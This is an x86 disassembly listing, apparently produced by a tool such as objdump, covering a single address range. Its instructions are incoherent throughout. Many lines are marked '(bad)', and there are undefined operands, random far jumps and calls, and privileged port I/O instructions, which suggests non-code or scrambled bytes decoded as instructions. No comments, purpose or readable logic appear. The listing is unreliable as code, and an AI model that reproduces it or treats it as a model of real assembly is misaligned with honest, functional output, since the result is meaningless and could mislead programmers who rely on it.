  424bed:	xor    BYTE PTR [eax+0x58],ch
  424bf0:	jne    0x424b80
  424bf2:	xchg   edx,eax
  424bf3:	dec    ebx
  424bf4:	jle    0x424baa
  424bf6:	mov    esi,0x8bc353cf
  424bfb:	loop   0x424bbb
  424bfd:	cmp    BYTE PTR [edi-0x2f757a07],0x91
  424c04:	xchg   DWORD PTR [eax-0x729f39ba],ebp
  424c0a:	or     edi,DWORD PTR [edi+ecx*4-0x38]
  424c0e:	cmp    ebx,DWORD PTR [ecx+0x6f]
  424c11:	sbb    eax,0x8d1c8fe8
  424c16:	sbb    dh,BYTE PTR [ebx+eax*4-0x53]
  424c1a:	xchg   ah,bl
  424c1c:	sbb    DWORD PTR [edi+0x16d75d11],0xf0bf4236
  424c26:	mov    ch,0xed
  424c28:	cmp    ax,0xbd21
  424c2c:	test   al,0xb0
  424c2e:	inc    edi
  424c2f:	add    dh,BYTE PTR [eax-0x1255a14b]
  424c35:	or     bl,BYTE PTR [ebp+0x5e]
  424c38:	push   ds
  424c39:	jecxz  0x424c86
  424c3b:	push   ebp
  424c3c:	sub    DWORD PTR [ecx-0x5e24d8e7],edx
  424c42:	add    eax,0x6629e1db
  424c47:	push   ebx
  424c48:	lods   eax,DWORD PTR ds:[esi]
  424c49:	xchg   esi,eax
  424c4a:	ds add dh,cl
  424c4d:	sbb    BYTE PTR [eax+0x7745b742],ah
  424c53:	push   ds
  424c54:	mov    edx,eax
  424c56:	and    DWORD PTR es:[edx+0x452708b8],0x5991a81c
  424c61:	pop    ss
  424c62:	retf   
  424c63:	cmp    edx,DWORD PTR [esi]
  424c65:	lea    edx,[edx]
  424c67:	jl     0x424c2e
  424c69:	push   ds
  424c6a:	xchg   ebx,eax
  424c6b:	fidivr WORD PTR [ebx+0x77]
  424c6e:	mov    edi,0x6e35768
  424c73:	adc    BYTE PTR [edx],al
  424c75:	gs jmp 0x424c6d
  424c78:	mov    bl,ch
  424c7a:	inc    ebx
  424c7b:	cmp    dh,BYTE PTR ds:0x631ca788
  424c81:	inc    ecx
  424c82:	add    dl,bl
  424c84:	fstp   QWORD PTR [ebp+0x5658b121]
  424c8a:	sub    DWORD PTR [ebp+0xf],edi
  424c8d:	jecxz  0x424c29
  424c8f:	shl    DWORD PTR ss:[ebx],0x37
  424c93:	jmp    0xba08:0x2ccbbea8
  424c9a:	bound  esi,QWORD PTR [edi+0x77]
  424c9d:	lods   al,BYTE PTR ds:[esi]
  424c9e:	cmp    al,0xbe
  424ca0:	es fwait
  424ca2:	les    eax,FWORD PTR [esp+edi*2+0x1c7fcc94]
  424ca9:	sbb    al,0x43
  424cab:	loope  0x424c3e
  424cad:	push   es
  424cae:	rcl    DWORD PTR [edx+0x4f],cl
  424cb1:	mov    al,0x3f
  424cb3:	mov    DWORD PTR [edx+0x6a895254],ecx
  424cb9:	and    eax,0xa569ef0
  424cbe:	(bad)  
  424cbf:	aas    
  424cc0:	sbb    bl,0x6a
  424cc3:	adc    al,BYTE PTR [edx]
  424cc5:	sbb    eax,0x46e9dd91
  424cca:	push   ebx
  424ccb:	js     0x424cd3
  424ccd:	sahf   
  424cce:	das    
  424ccf:	int    0x6c
  424cd1:	fisttp WORD PTR [esp+edx*1+0x4e278639]
  424cd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424cd9:	ret    
  424cda:	or     bl,0x98
  424cdd:	jmp    0xcd86:0xc02b9fd6
  424ce4:	scas   eax,DWORD PTR es:[edi]
  424ce5:	jo     0x424c97
  424ce7:	lods   eax,DWORD PTR ds:[esi]
  424ce8:	sbb    edi,DWORD PTR [ecx-0x3e]
  424ceb:	ins    BYTE PTR es:[edi],dx
  424cec:	icebp  
  424ced:	pop    edx
  424cee:	fwait
  424cef:	(bad)  
  424cf0:	(bad)  
  424cf1:	adc    ebx,ecx
  424cf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424cf4:	mov    eax,0x52269049
  424cf9:	loop   0x424cbf
  424cfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424cfc:	dec    DWORD PTR [ebp+eax*1+0x1458b08a]
  424d03:	and    ebp,esi
  424d05:	xor    BYTE PTR [ecx+0x5e],dh
  424d08:	lds    edi,FWORD PTR [ebx]
  424d0a:	cmp    al,0xd4
  424d0c:	mov    dh,0x4c
  424d0e:	rcl    BYTE PTR [eax+0x5ad40794],cl
  424d14:	lahf   
  424d15:	adc    esp,DWORD PTR [edx-0x1f]
  424d18:	mov    al,ds:0xa4a3cfe9
  424d1d:	jno    0x424d47
  424d1f:	mov    ?,WORD PTR [edx]
  424d21:	xchg   edx,eax
  424d22:	les    ebx,FWORD PTR [ebx+0xc94b486]
  424d28:	es call 0x16e83e0d
  424d2e:	and    DWORD PTR [eax-0x49],ebx
  424d31:	xchg   ebx,eax
  424d32:	out    0x50,eax
  424d34:	lahf   
  424d35:	pusha  
  424d36:	addr16 jle 0x424cbf
  424d39:	mov    ds:0x7e0ac755,al
  424d3e:	sahf   
  424d3f:	je     0x424d04
  424d41:	push   ebx
  424d42:	sub    al,0xaa
  424d44:	cmp    ebx,ecx
  424d46:	ret    
  424d47:	(bad)  
  424d48:	aam    0x34
  424d4a:	arpl   sp,si
  424d4c:	fsub   DWORD PTR [ecx+0x6b7c8c55]
  424d52:	stos   BYTE PTR es:[edi],al
  424d53:	pop    edi
  424d54:	in     al,0xf4
  424d56:	or     ch,BYTE PTR [ecx]
  424d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d59:	xchg   edi,eax
  424d5a:	xchg   DWORD PTR [esi-0x2d],eax
  424d5d:	cdq    
  424d5e:	(bad)  
  424d5f:	out    0x2d,al
  424d61:	idiv   BYTE PTR [esp+ebx*4-0x78d7ad98]
  424d68:	sub    eax,0x6e9421bc
  424d6d:	mov    cl,0x49
  424d6f:	imul   ebp,DWORD PTR [ebp-0x67],0x3b
  424d73:	mov    DWORD PTR [ebp+0x15632cf6],edx
  424d79:	xor    BYTE PTR [eax-0x11],0x84
  424d7d:	pop    eax
  424d7e:	and    al,0x97
  424d80:	cld    
  424d81:	or     dl,BYTE PTR [esi]
  424d83:	call   0x56ab:0x62deab9d
  424d8a:	jb     0x424d12
  424d8c:	mov    dh,0x9b
  424d8e:	jl     0x424e00
  424d90:	test   DWORD PTR [ecx-0x2a],0xfff4fc7e
  424d97:	(bad)  
  424d99:	or     DWORD PTR [esi],esp
  424d9b:	test   BYTE PTR ds:0x577d060c,dl
  424da1:	nop
  424da2:	fld    QWORD PTR [esi-0x7ece6d32]
  424da8:	lea    edx,[eax]
  424daa:	(bad)  [ebx+0x5f]
  424dad:	inc    eax
  424dae:	sbb    BYTE PTR [si-0x4520],bh
  424db3:	pop    edi
  424db4:	std    
  424db5:	int    0x8c
  424db7:	stos   BYTE PTR es:[edi],al
  424db8:	jo     0x424df9
  424dba:	outs   dx,BYTE PTR ds:[esi]
  424dbb:	iret   
  424dbc:	je     0x424db1
  424dbe:	dec    ebp
  424dbf:	(bad)  [ecx]
  424dc1:	sbb    ah,bl
  424dc3:	push   eax
  424dc4:	fld    QWORD PTR ds:0x82e41bd1
  424dca:	jae    0x424d91
  424dcc:	xchg   ecx,eax
  424dcd:	sar    cl,0xbc
  424dd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424dd1:	and    al,0xd0
  424dd3:	add    ecx,DWORD PTR [ecx]
  424dd5:	stc    
  424dd6:	or     DWORD PTR [ebx-0x5c],ebp
  424dd9:	mov    eax,ds:0x2f377c3d
  424dde:	pop    es
  424ddf:	xchg   DWORD PTR [ecx+0x6c],esi
  424de2:	or     al,0x64
  424de4:	imul   ebx,DWORD PTR [esi+ebx*1+0x43e9f34a],0x2c0011d1
  424def:	or     al,0x99
  424df1:	loope  0x424e27
  424df3:	mov    ebx,0x2b3be51e
  424df8:	or     DWORD PTR [ecx-0x5bfd4e],esi
  424dfe:	in     eax,0xc7
  424e00:	pusha  
  424e01:	shl    ah,cl
  424e03:	sbb    BYTE PTR [ebp+0x26],ch
  424e06:	pop    ebx
  424e07:	dec    esi
  424e08:	fstp   QWORD PTR [ebp-0x2f]
  424e0b:	inc    esi
  424e0c:	jno    0x424de2
  424e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e0f:	dec    ecx
  424e10:	cld    
  424e11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e12:	jb     0x424e60
  424e14:	adc    dl,ch
  424e16:	push   0xe9e0ec1a
  424e1b:	sahf   
  424e1c:	cli    
  424e1d:	dec    ebp
  424e1e:	add    BYTE PTR [eax-0x1b],bl
  424e21:	(bad)  
  424e22:	js     0x424e8b
  424e24:	bound  ebp,QWORD PTR [edi+0x7b]
  424e27:	dec    ecx
  424e28:	fwait
  424e29:	mov    ds,eax
  424e2b:	call   0x313a3dcc
  424e30:	push   cs
  424e31:	dec    esi
  424e32:	push   ebp
  424e33:	pop    es
  424e34:	dec    esp
  424e35:	nop
  424e36:	xor    DWORD PTR [ecx],edx
  424e38:	ins    DWORD PTR es:[edi],dx
  424e39:	out    0xf8,eax
  424e3b:	test   BYTE PTR [ebx+0x3ff8b089],bl
  424e41:	jbe    0x424e02
  424e43:	into   
  424e44:	push   es
  424e45:	pop    esi
  424e46:	xor    ebx,ebp
  424e48:	iret   
  424e49:	add    eax,0x34da27aa
  424e4e:	mov    ch,0x6b
  424e50:	fwait
  424e51:	inc    esp
  424e52:	mov    eax,esp
  424e54:	inc    ecx
  424e55:	pop    esp
  424e56:	iret   
  424e57:	mov    WORD PTR [edx-0x48],?
  424e5a:	std    
  424e5b:	ja     0x424e35
  424e5d:	bound  ebp,QWORD PTR [edi]
  424e5f:	out    0x82,al
  424e61:	aaa    
  424e62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424e64:	test   al,0x8d
  424e66:	sbb    ebx,DWORD PTR [ebx+0x75]
  424e69:	in     al,0x63
  424e6b:	sub    eax,0x70c96e63
  424e70:	ds mov ebx,0xee130d27
  424e76:	cdq    
  424e77:	inc    edx
  424e78:	xlat   BYTE PTR ds:[ebx]
  424e79:	out    0x4e,al
  424e7b:	mov    ch,0xf1
  424e7d:	or     edx,DWORD PTR [edx+0x2ea62cbd]
  424e83:	and    dl,cl
  424e85:	push   ds
  424e86:	xchg   edi,eax
  424e87:	push   ebx
  424e88:	jge    0x424ea0
  424e8a:	daa    
  424e8b:	stc    
  424e8c:	fwait
  424e8d:	push   ebx
  424e8e:	sbb    edi,DWORD PTR fs:[edi-0x5e9dad1a]
  424e95:	or     eax,0x98fada80
  424e9a:	stos   BYTE PTR es:[edi],al
  424e9b:	aad    0x9
  424e9d:	sub    BYTE PTR [ebp+0x48],al
  424ea0:	mov    cl,0xe9
  424ea2:	sub    dh,dh
  424ea4:	cdq    
  424ea5:	clc    
  424ea6:	add    al,0x66
  424ea8:	rol    cl,1
  424eaa:	imul   esp,esp,0x98ce93e8
  424eb0:	jge    0x424f12
  424eb2:	cdq    
  424eb3:	fistp  DWORD PTR [ecx-0x25]
  424eb6:	xchg   esi,eax
  424eb7:	pop    edi
  424eb8:	jns    0x424ea2
  424eba:	push   ebx
  424ebb:	(bad)  
  424ebc:	jae    0x424edd
  424ebe:	mov    ebp,0x4df52f73
  424ec3:	jecxz  0x424f1f
  424ec5:	(bad)  
  424ec6:	retf   0x4441
  424ec9:	pop    edx
  424eca:	sub    eax,0xa95640ea
  424ecf:	push   eax
  424ed0:	push   0xffffff8d
  424ed2:	mov    DWORD PTR [ebx+0x3e],ebx
  424ed5:	fs je  0x424edc
  424ed8:	add    BYTE PTR [esi],cl
  424eda:	xchg   ebx,eax
  424edb:	in     eax,0x3d
  424edd:	jg     0x424f36
  424edf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ee0:	stos   DWORD PTR es:[edi],eax
  424ee1:	sbb    BYTE PTR [edx+0x284e3aa],cl
  424ee7:	(bad)  [ebx]
  424ee9:	dec    eax
  424eea:	dec    ebx
  424eeb:	mov    bl,0x56
  424eed:	add    BYTE PTR cs:[esi-0x54],bh
  424ef1:	pop    esi
  424ef2:	hlt    
  424ef3:	retf   0xf595
  424ef6:	or     eax,0x452c3190
  424efb:	xlat   BYTE PTR ds:[ebx]
  424efc:	inc    ecx
  424efd:	gs std 
  424eff:	push   esp
  424f00:	xchg   esp,eax
  424f01:	pop    edi
  424f02:	loop   0x424f7c
  424f04:	cmp    al,0xd0
  424f06:	mov    esi,ss
  424f08:	jle    0x424eef
  424f0a:	xor    DWORD PTR [ebx-0x78],0x623713aa
  424f11:	retf   
  424f12:	js     0x424eb1
  424f14:	jno    0x424f47
  424f16:	cli    
  424f17:	or     ecx,ebx
  424f19:	test   BYTE PTR [esi+edx*4],0x25
  424f1d:	loop   0x424f4e
  424f1f:	inc    ecx
  424f20:	sti    
  424f21:	fcmovne st,st(2)
  424f23:	push   edx
  424f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f25:	call   0x69e7:0x45493b5c
  424f2c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  424f2e:	sub    al,0x7
  424f30:	div    bl
  424f32:	dec    edi
  424f33:	xchg   edi,eax
  424f34:	jae    0x424f4a
  424f36:	fwait
  424f37:	xchg   edi,eax
  424f38:	call   0x38df:0x94c10776
  424f3f:	mov    dh,0x5f
  424f41:	mov    ds:0xec344e1,al
  424f46:	sub    ebp,DWORD PTR [ecx]
  424f48:	loopne 0x424eff
  424f4a:	pop    esp
  424f4b:	mov    esi,DWORD PTR [ebx-0x10f972b4]
  424f51:	ins    DWORD PTR es:[edi],dx
  424f52:	fiadd  WORD PTR [ecx+0x6]
  424f55:	sahf   
  424f56:	ret    
  424f57:	int3   
  424f58:	mov    eax,ebp
  424f5a:	push   ebx
  424f5b:	ss call 0x370b1962
  424f61:	aaa    
  424f62:	retf   
  424f63:	jo     0x424f2e
  424f65:	data16 int3 
  424f67:	nop
  424f68:	adc    eax,0x3da4465f
  424f6d:	js     0x424f32
  424f6f:	cli    
  424f70:	inc    ecx
  424f71:	mov    ah,0xd6
  424f73:	stos   BYTE PTR es:[edi],al
  424f74:	imul   esp,DWORD PTR ds:0x11abdbf3,0x15
  424f7b:	xor    ch,ah
  424f7d:	xchg   edi,eax
  424f7e:	ret    
  424f7f:	cmp    al,0x56
  424f81:	push   0xbee67bd6
  424f86:	daa    
  424f87:	xor    eax,0xaa121ac6
  424f8c:	ins    BYTE PTR es:[edi],dx
  424f8d:	std    
  424f8e:	push   eax
  424f8f:	mov    esi,0xa675993c
  424f94:	push   esp
  424f95:	test   BYTE PTR [edx],cl
  424f97:	ins    BYTE PTR es:[edi],dx
  424f98:	popa   
  424f99:	rol    DWORD PTR [ecx+eiz*8],cl
  424f9c:	ss mov cl,0xa0
  424f9f:	mov    ds:0xfaa8b312,al
  424fa4:	sti    
  424fa5:	pop    ecx
  424fa6:	mov    dh,0x8
  424fa8:	mov    esp,0xbdb7764b
  424fae:	adc    ah,BYTE PTR [edi+eax*8-0x6632a42b]
  424fb5:	cli    
  424fb6:	xor    ebx,DWORD PTR [ecx+0x1353d058]
  424fbc:	jb     0x424fd1
  424fbe:	sub    dl,BYTE PTR [edx+0x39]
  424fc1:	imul   DWORD PTR [edx+ecx*4-0x7e]
  424fc5:	dec    esp
  424fc6:	jmp    0xcb178973
  424fcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424fcc:	or     eax,edx
  424fce:	jb     0x424fab
  424fd0:	jge    0x424f8b
  424fd2:	fdiv   DWORD PTR [edi+0x5f89042]
  424fd8:	mov    bh,0x65
  424fda:	sub    eax,0x2ddb0ea8
  424fdf:	(bad)  
  424fe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424fe2:	loopne 0x425006
  424fe4:	fst    DWORD PTR [edi-0x7facfec5]
  424fea:	cmc    
  424feb:	sbb    bh,BYTE PTR [ebp+0x60]
  424fee:	call   0x60b3:0xc3675c43
  424ff5:	mov    al,0xa4
  424ff7:	out    dx,eax
  424ff8:	cmp    al,ch
  424ffa:	iret   
  424ffb:	pop    es
  424ffc:	jb     0x425071
  424ffe:	fidivr WORD PTR [edx+0x53]
  425001:	add    eax,0xbfffeaf4
  425006:	dec    ecx
  425007:	int    0x3f
  425009:	jno    0x425015
  42500b:	pop    edi
  42500c:	dec    ecx
  42500d:	aaa    
  42500e:	and    BYTE PTR [edx-0x4f],0x2
  425012:	mov    ebx,0x9d6a2c76
  425017:	push   edi
  425018:	mov    esp,DWORD PTR [esi-0x4f400de0]
  42501e:	fimul  DWORD PTR [eax+0x7a]
  425021:	pushf  
  425022:	out    dx,al
  425023:	stos   BYTE PTR es:[edi],al
  425024:	gs pop ds
  425026:	pop    es
  425027:	or     BYTE PTR ds:0x4fb4be34,dl
  42502d:	xchg   esp,eax
  42502e:	xchg   ebx,eax
  42502f:	(bad)  
  425030:	sbb    dl,BYTE PTR [eax]
  425032:	popf   
  425033:	leave  
  425034:	mov    edx,0x76fd4150
  425039:	sub    al,0xd4
  42503b:	ja     0x425053
  42503d:	imul   edx,ebx,0xffffffe4
  425040:	pop    esi
  425041:	xor    BYTE PTR [ebx+ebx*8+0x7b789f3a],bh
  425048:	sar    ecx,0xcf
  42504b:	je     0x425063
  42504d:	cli    
  42504e:	cmovns ebx,DWORD PTR [ecx]
  425051:	adc    eax,0xbfaadc55
  425056:	or     eax,edx
  425058:	mov    bh,0xad
  42505a:	add    DWORD PTR [ecx+0x12],eax
  42505d:	mov    dl,0xc5
  42505f:	mov    edx,0x50003b1e
  425064:	cwde   
  425065:	popa   
  425066:	inc    edx
  425067:	inc    edi
  425068:	add    ebx,DWORD PTR [ecx]
  42506a:	sbb    cl,0x18
  42506d:	add    eax,0xc36144d4
  425072:	xchg   esi,eax
  425073:	iret   
  425074:	mov    ebx,0xebeae32
  425079:	xlat   BYTE PTR ds:[ebx]
  42507a:	in     al,dx
  42507b:	shl    ebp,cl
  42507d:	sbb    DWORD PTR [eax+0x7d403236],edx
  425083:	(bad)  
  425084:	fiadd  WORD PTR [esi+0x75]
  425087:	sbb    edx,ecx
  425089:	dec    eax
  42508a:	shr    DWORD PTR [edi*4-0x14f30791],cl
  425091:	in     al,dx
  425092:	inc    edi
  425093:	add    al,0x84
  425095:	jns    0x4250c6
  425097:	mov    edi,0x59aa693e
  42509c:	scas   al,BYTE PTR es:[edi]
  42509d:	sahf   
  42509e:	push   cs
  42509f:	(bad)  [esi-0x1d]
  4250a2:	cwde   
  4250a3:	mov    ecx,DWORD PTR [edx]
  4250a5:	mov    cl,0x28
  4250a7:	pop    ecx
  4250a8:	or     esi,DWORD PTR [ebx+0x7f48a9ff]
  4250ae:	cmp    eax,0x4d12ee7f
  4250b3:	inc    edx
  4250b4:	mov    esp,DWORD PTR [ebx+0x6c]
  4250b7:	fldcw  WORD PTR [edx+edi*2+0x20]
  4250bb:	pop    ebx
  4250bc:	dec    eax
  4250bd:	pop    ebp
  4250be:	cmp    eax,0xc669eead
  4250c3:	stos   BYTE PTR es:[edi],al
  4250c4:	sub    dh,al
  4250c6:	jle    0x425084
  4250c8:	jmp    0x425099
  4250ca:	stos   BYTE PTR es:[edi],al
  4250cb:	into   
  4250cc:	repnz or BYTE PTR [esi],dl
  4250cf:	in     eax,dx
  4250d0:	rcr    BYTE PTR [edx],cl
  4250d2:	aas    
  4250d3:	stos   DWORD PTR es:[edi],eax
  4250d4:	(bad)  
  4250d5:	fdivr  QWORD PTR [esi-0x492726c3]
  4250db:	outs   dx,BYTE PTR ds:[esi]
  4250dc:	pop    esi
  4250dd:	and    al,0xaf
  4250df:	push   esp
  4250e0:	sahf   
  4250e1:	icebp  
  4250e2:	lock dec ecx
  4250e4:	ins    BYTE PTR es:[edi],dx
  4250e5:	dec    esp
  4250e6:	add    ah,BYTE PTR [eax-0x56557293]
  4250ec:	hlt    
  4250ed:	xor    al,0x0
  4250ef:	adc    BYTE PTR [esi-0x3d],0x17
  4250f3:	sbb    al,0xf2
  4250f5:	int    0xf
  4250f7:	das    
  4250f8:	cwde   
  4250f9:	(bad)  [esi+0xd7868be]
  4250ff:	fist   WORD PTR [edx+0x0]
	...
  42510a:	pop    ecx
  42510b:	push   ebp
  42510c:	push   esp
  42510d:	push   edx
  42510e:	pop    esp
  42510f:	push   ebx
  425110:	pop    edi
  425111:	pop    edi
  425112:	xchg   ebx,eax
  425113:	stos   DWORD PTR es:[edi],eax
  425114:	mov    ebx,0x37463296
  425119:	aas    
  42511a:	rcr    esi,0x1
  42511d:	add    BYTE PTR [edi+0x6],bh
  425120:	add    BYTE PTR [eax],al
  425122:	add    ecx,ebp
  425124:	(bad)  
  425125:	sub    ecx,esp
  425127:	loopne 0x425151
  425129:	mov    ebx,0x95a37f7c
  42512e:	jmp    0x4e074ee9
  425133:	or     dl,BYTE PTR [esi+0x328bd4d4]
  425139:	sub    esp,ecx
  42513b:	test   al,0x3d
  42513d:	push   cs
  42513e:	adc    al,0xfd
  425140:	test   DWORD PTR [eax+0x7e],eax
  425143:	ins    DWORD PTR es:[edi],dx
  425144:	push   ebp
  425145:	mov    WORD PTR [esi-0x18cee503],?
  42514b:	jle    0x425171
  42514d:	in     al,0x3
  42514f:	iret   
  425150:	(bad)  [ecx+ebp*4-0x59e4e51b]
  425157:	lods   eax,DWORD PTR ds:[esi]
  425158:	or     ecx,DWORD PTR [ecx-0x4eac4e41]
  42515e:	fucom  st(5)
  425160:	sub    BYTE PTR [edx-0x48],bh
  425163:	test   ah,dl
  425165:	adc    cl,BYTE PTR [edx]
  425167:	lea    edx,[esi+0x1]
  42516a:	in     al,0x2d
  42516c:	add    edx,esp
  42516e:	jne    0x4251af
  425170:	loopne 0x4251a2
  425172:	arpl   WORD PTR [esp+edx*8],si
  425175:	rcl    DWORD PTR [eax],1
  425177:	xchg   ecx,eax
  425178:	inc    esp
  425179:	jnp    0x4251d7
  42517b:	add    esp,DWORD PTR [eax]
  42517d:	repnz cli 
  42517f:	mov    dx,0x8713
  425183:	mov    ds:0x4976fa71,al
  425188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425189:	cmp    ch,BYTE PTR [edx+ecx*2-0x27]
  42518d:	imul   ebx,DWORD PTR [ecx+0x357bbb8],0xfcec4edd
  425197:	add    al,0xa9
  425199:	jge    0x4251c4
  42519b:	dec    ecx
  42519c:	mov    dh,0xbf
  42519e:	and    eax,0xfaea6efb
  4251a3:	mov    WORD PTR [ebx+0x5c7feca7],es
  4251a9:	pop    esi
  4251aa:	mov    eax,ds:0x2fd0ad32
  4251af:	lea    eax,[ecx-0x70]
  4251b2:	clc    
  4251b3:	push   ecx
  4251b4:	inc    edx
  4251b5:	xchg   ecx,eax
  4251b6:	mov    esi,0xab044e4
  4251bb:	mov    ecx,0x3512fc46
  4251c0:	dec    eax
  4251c1:	push   0x4d
  4251c3:	xor    al,0xb
  4251c5:	jp     0x4251d8
  4251c7:	add    eax,0x47b8562d
  4251cc:	add    ebp,DWORD PTR [edi-0x2291e812]
  4251d2:	sbb    cl,BYTE PTR [edi+0x1306f7e7]
  4251d8:	(bad)  
  4251da:	mov    dl,0x2a
  4251dc:	scas   al,BYTE PTR es:[edi]
  4251dd:	mov    ebx,0x3fe4c607
  4251e3:	sbb    esi,DWORD PTR es:[ebp+0x8356037]
  4251ea:	bound  ebx,QWORD PTR [eax+0x4f]
  4251ed:	sahf   
  4251ee:	jmp    0x88956ebf
  4251f3:	xor    bh,BYTE PTR [ebx]
  4251f5:	sbb    esi,edi
  4251f7:	das    
  4251f8:	icebp  
  4251f9:	push   eax
  4251fa:	xor    dl,bh
  4251fc:	or     eax,0xeb2bbeb7
  425201:	jmp    0xa1d2:0x2c1a145d
  425208:	popa   
  425209:	cmp    al,BYTE PTR [ebp+0x2581f960]
  42520f:	ins    BYTE PTR es:[edi],dx
  425210:	sub    ah,bh
  425212:	in     al,dx
  425213:	js     0x42519b
  425215:	lock clc 
  425217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425218:	out    dx,eax
  425219:	jmp    0x7e9bf721
  42521e:	or     al,0x44
  425220:	lahf   
  425221:	cmp    ah,BYTE PTR [edi]
  425223:	shr    DWORD PTR [eax],0x75
  425226:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425227:	pop    es
  425228:	popa   
  425229:	fist   WORD PTR [edx+0x3f]
  42522c:	cmp    BYTE PTR [ebp-0x1a84f1c3],bl
  425232:	gs sbb al,0x2b
  425235:	imul   ecx,edx,0x8a7849af
  42523b:	jbe    0x425226
  42523d:	ins    DWORD PTR es:[edi],dx
  42523e:	(bad)  
  42523f:	cmp    al,0xd9
  425241:	sub    BYTE PTR [ebx+esi*8],0x13
  425245:	sqrtps xmm7,XMMWORD PTR [edi-0x44a17a2e]
  42524c:	das    
  42524d:	or     DWORD PTR [ebx-0x5fbb8f66],0xffffffc8
  425254:	leave  
  425255:	dec    esp
  425256:	inc    edx
  425257:	push   ebx
  425258:	rcr    BYTE PTR [edx+0x257e1a76],1
  42525e:	test   eax,0xd976d84c
  425263:	loop   0x425254
  425265:	mov    ebx,0x7e66a452
  42526a:	jg     0x425245
  42526c:	xchg   DWORD PTR [esi+esi*2],esp
  42526f:	mov    cl,0xe8
  425271:	in     al,dx
  425272:	pop    ecx
  425273:	or     BYTE PTR [ecx+0x3d],0x15
  425277:	in     eax,0xa9
  425279:	mov    ds:0x8fb2d6b4,eax
  42527e:	xor    BYTE PTR ds:0x75be2e72,ah
  425284:	xor    BYTE PTR [edx-0x44e7d028],ah
  42528a:	cwde   
  42528b:	sub    al,0x36
  42528d:	mov    WORD PTR cs:[si+0x35],cs
  425292:	pop    edi
  425293:	sub    eax,ebp
  425295:	add    DWORD PTR [eax+0x1497b217],ebp
  42529b:	adc    BYTE PTR [ebp-0x262be1ea],0x64
  4252a2:	jne    0x42526b
  4252a4:	ja     0x425315
  4252a6:	adc    bh,bh
  4252a8:	and    eax,DWORD PTR [edx+0x36]
  4252ab:	dec    ebx
  4252ac:	pop    ebp
  4252ad:	or     eax,0x2ff293d9
  4252b2:	dec    ebp
  4252b3:	nop
  4252b4:	imul   ecx,edi,0xffffff8e
  4252b7:	push   edx
  4252b8:	std    
  4252b9:	cmc    
  4252ba:	jo     0x42528e
  4252bc:	ret    
  4252bd:	cmp    ch,ch
  4252bf:	call   0x2d6c:0xf83eb301
  4252c6:	das    
  4252c7:	loop   0x4252c1
  4252c9:	fxtract 
  4252cb:	in     eax,dx
  4252cc:	mov    DWORD PTR [ebx+0x77],ecx
  4252cf:	dec    esi
  4252d0:	mov    WORD PTR [edi+0x57326c3f],ds
  4252d6:	je     0x4252f4
  4252d8:	or     ecx,esi
  4252da:	das    
  4252db:	add    esp,DWORD PTR [esi+0x5e]
  4252de:	aam    0xbd
  4252e0:	mov    edi,0xc5233566
  4252e5:	or     al,0xf1
  4252e7:	sbb    edi,DWORD PTR [edx+0x7]
  4252ea:	mov    al,0xb2
  4252ec:	mov    ecx,ds
  4252ee:	push   esp
  4252ef:	adc    al,0x5
  4252f1:	outs   dx,BYTE PTR ds:[esi]
  4252f2:	popa   
  4252f3:	adc    BYTE PTR ds:0x80052c02,bh
  4252f9:	cli    
  4252fa:	add    al,0xf4
  4252fc:	je     0x4252cb
  4252fe:	xchg   esi,esi
  425300:	(bad)  
  425301:	ins    BYTE PTR es:[edi],dx
  425302:	daa    
  425303:	pop    ebx
  425304:	cld    
  425305:	cld    
  425306:	cwde   
  425307:	nop
  425308:	pop    esi
  425309:	mov    edx,0x773f2c1a
  42530e:	mov    cl,0x75
  425310:	out    0xf8,al
  425312:	pop    ds
  425313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425314:	or     al,0x2a
  425316:	jg     0x425314
  425318:	xchg   ebx,eax
  425319:	and    al,0x99
  42531b:	jmp    0xb490de59
  425320:	xor    ah,ah
  425322:	dec    ebx
  425323:	or     al,0xfc
  425325:	or     dh,0x76
  425328:	adc    BYTE PTR [edi-0x1e3aaf2a],dh
  42532e:	dec    eax
  42532f:	fdivr  st,st(3)
  425331:	inc    esi
  425332:	aas    
  425333:	inc    edx
  425334:	sub    eax,0xa4815fd6
  425339:	pop    ds
  42533a:	push   eax
  42533b:	cs mov dh,0x1a
  42533e:	push   ss
  42533f:	sub    DWORD PTR [esi+0x42],esp
  425342:	pop    esp
  425343:	(bad)  
  425344:	call   0x34a39c1b
  425349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42534a:	dec    esi
  42534b:	sbb    eax,0x5bbd1e38
  425350:	and    al,0xa6
  425352:	loopne 0x42538a
  425354:	inc    esp
  425355:	xor    al,0x6a
  425357:	add    al,0xf
  425359:	add    al,BYTE PTR [eax]
  42535b:	loopne 0x4253a0
  42535d:	stos   BYTE PTR es:[edi],al
  42535e:	out    dx,al
  42535f:	xchg   DWORD PTR [edi+0x64],edi
  425362:	xchg   BYTE PTR ss:[ecx+eiz*2],bh
  425366:	sub    DWORD PTR [eax-0x5c3d3b1f],ebx
  42536c:	pop    eax
  42536d:	push   edx
  42536e:	adc    al,0xbc
  425370:	inc    esp
  425371:	mov    ?,WORD PTR [ecx+0x1e]
  425374:	jo     0x425311
  425376:	arpl   di,bx
  425378:	adc    BYTE PTR [ebp+0x9ee4461],ah
  42537e:	jle    0x4253ce
  425380:	ins    BYTE PTR es:[edi],dx
  425381:	xchg   esi,eax
  425382:	test   BYTE PTR [ebx+edi*1-0x52fb6e93],bl
  425389:	fisttp QWORD PTR [ecx+0x7931a0cb]
  42538f:	cmp    al,0xa5
  425391:	xchg   edx,eax
  425392:	pusha  
